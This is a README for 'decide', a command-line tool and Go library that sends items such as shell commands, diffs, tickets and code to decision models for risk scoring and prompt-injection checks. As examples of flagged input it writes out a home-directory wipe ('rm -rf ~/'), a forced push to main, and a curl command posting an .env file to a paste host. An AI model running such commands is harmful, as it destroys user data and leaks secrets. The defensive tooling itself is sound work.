# decide

[![Reference](https://img.shields.io/badge/reference-pkg.go.dev-00ADD8?style=flat-square&logo=go&logoColor=white&labelColor=2f363d)](https://pkg.go.dev/github.com/deepnoodle-ai/decide)
[![Tests](https://img.shields.io/github/actions/workflow/status/deepnoodle-ai/decide/ci.yml?branch=main&style=flat-square&label=tests&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/deepnoodle-ai/decide?style=flat-square&label=release&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/releases)

**Judgment calls, at scale.**

Find the vulnerable function in a codebase, the urgent ticket in a
queue, the risky change in a pull request. decide asks a decision model
about every one, from your shell, CI, Go code, or Claude Code.

A decision model doesn't write anything. Ask it a question and it
answers yes or no, picks an option, or gives a score, with a probability
attached. That makes it fast and cheap enough to ask about every item in
the queue, not a sample. Act on the answers it's sure of. Send the close
calls to a person.

[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)

**Docs: [decide.deepnoodle.ai](https://decide.deepnoodle.ai)**. The
[quickstart](https://decide.deepnoodle.ai/start/) gets you to a first
answer. After that there are
[tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/),
[recipes](https://decide.deepnoodle.ai/recipes/) for CI and git hooks, a
[Go guide](https://decide.deepnoodle.ai/start/go/), and a
[guide for agents](https://decide.deepnoodle.ai/reference/agents/).

## Install

```sh
brew install deepnoodle-ai/tap/decide
```

Or `go install github.com/deepnoodle-ai/decide/cmd/decide@latest`, or
grab a binary from the [releases](https://github.com/deepnoodle-ai/decide/releases).
Run `decide` on its own for a tour.

## Try it

Set a key and ask about a command you'd rather not run:

```sh
export TYPESAFE_API_KEY=...   # a key from typesafe.ai

echo 'rm -rf ~/' | decide run command-risk
```

```
Running command-risk on 1 line · typesafe jev-latest

stdin:1  rm -rf ~/
! destructive  yes     98%
  leak         no      89%
  publish      no      74%
! severe       yes     98%

✓ 1 answered  ! 1 flagged  200ms
Flagged: stdin:1
See these results again with: decide runs view 20261008-040438-f7af
```

Four answers, four probabilities, nothing to parse. Add
`--fail-on flagged` and decide exits with code 2 when anything is
flagged. That's all a git hook or a CI job needs to stop.

## In Claude Code

```text
/plugin marketplace add deepnoodle-ai/decide
/plugin install decide@decide
```

The plugin gets Claude a second opinion at the moments its own
judgment is most likely to slip. When Claude fetches a page or reads a
tool result, decide checks it for prompt injection first. In bypass
mode, decide checks each shell command before it runs. Claude also gets
a judge tool for its own questions.

Two skills work on a whole codebase at once. `/decide:audit` ranks every
function for security bugs, and Claude reads only the top few.
`/decide:hunt` takes a bug fix and finds where the same mistake lives
elsewhere. See the
[Claude Code guide](https://decide.deepnoodle.ai/reference/claude-code/)
and [plugin/README.md](plugin/README.md).

## The small calls inside your automations

Every pipeline has judgment calls that are too many for a person and
too fuzzy for a rule. Here are six decide makes out of the box:

```sh
git diff main | decide run code-risk --fail-on flagged   # gate the merge
echo "$CMD" | decide run command-risk --fail-on flagged  # check an agent's command
decide run ticket-routing tickets.jsonl --field body     # route the queue
decide run security src                                  # rank a codebase
decide run receipt-quality receipts/ --provider openai   # read the photos
decide run invoice-check invoices/ --provider gemini     # check the PDFs
```

## Reads text, code, images, audio, video, and PDFs

Point decide at a file, a folder, a diff, or standard input. It splits
what it finds into items and asks about each one on its own:

- **Text and Markdown**, by line, section, or file.
- **Source code** in Go, Python, JavaScript, TypeScript, and Java, by
  function, each sent with its imports. On a diff, only the functions
  that changed.
- **JSON, JSONL, and CSV**, by record, with `--field` to pick the text.
- **Images, audio, video, and PDFs**, one item per file, with any
  template. A screenshot of a diff works with `code-risk` just fine.

Long items are judged in parts. Every answer is cached in
`~/.decide/cache`, so running again over a codebase asks only about what
changed and costs almost nothing. Results print as text, JSON, CSV, a
Markdown report, or GitHub Actions annotations on a pull request. See
[items](https://decide.deepnoodle.ai/reference/items/) and
[output](https://decide.deepnoodle.ai/reference/output/).

## Twelve templates, built in

A template is a set of questions in a few lines of JSON. The built-in
ones come with tuned wording and flag thresholds, so you don't have to
work out what "risky" means before lunch.

| Template | Asks |
| --- | --- |
| `sentiment` | Positive, negative, or neutral? |
| `triage` | Is this support request urgent? How bad is the impact? |
| `ticket-routing` | Billing, engineering, or other? |
| `relevance` | Does this answer a question you choose? |
| `code-risk` | Could this code cause security or data problems? |
| `security` | Can untrusted input reach a query, a command, a URL, or a page? |
| `prompt-injection` | Is this text trying to hijack an AI agent? |
| `task-readiness` | Is this issue ready for a coding agent? How big is it? |
| `pr-description` | Does this pull request's description meet your guidelines? |
| `command-risk` | Could this shell command destroy work or leak secrets? |
| `receipt-quality` | Is this a readable receipt? (image) |
| `invoice-check` | Is this a complete, paid invoice? (PDF, Gemini only) |

Need a different question? `decide templates new NAME --from TEMPLATE`
copies a template for you to edit. See
[templates](https://decide.deepnoodle.ai/reference/templates/). Want to
watch them catch something? The [demo](demo/README.md) is a small
repository with planted problems.

## Four decision models, one set of commands

Jev is the default. Switch with `--provider cloudflare`, `openai`, or
`gemini`, or set `DECIDE_PROVIDER` once. Nothing else changes, not the
commands and not the Go code.

| Provider | Model | Key | Reads |
| --- | --- | --- | --- |
| [Jev](https://docs.typesafe.ai/introduction) by TypeSafe | `jev-latest` | `TYPESAFE_API_KEY` | text |
| [Clef](https://developers.cloudflare.com/workers-ai/models/clef/) by Cloudflare | `clef`, `clef-flash` | `CLOUDFLARE_AUTH_TOKEN`, `CLOUDFLARE_ACCOUNT_ID` | text, images |
| [GPT-6 Luna](https://developers.openai.com/api/docs/guides/decisions) by OpenAI | `gpt-6-luna` | `OPENAI_API_KEY` | text, images |
| [Gemini Decision](https://aistudio.google.com/docs/decisions-api) by Google | `gemini-decision-1` | `GEMINI_API_KEY` | text, images, audio, video, PDFs |

The [providers page](https://decide.deepnoodle.ai/reference/providers/)
lists file formats and size limits, and shows how to point decide at a
Jev-compatible service you host yourself.

## Contributing

Issues and pull requests are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md)
first, and report security issues as described in [SECURITY.md](SECURITY.md).
Before v1, the library API and the CLI may change in any release.

## License

[Apache 2.0](LICENSE)
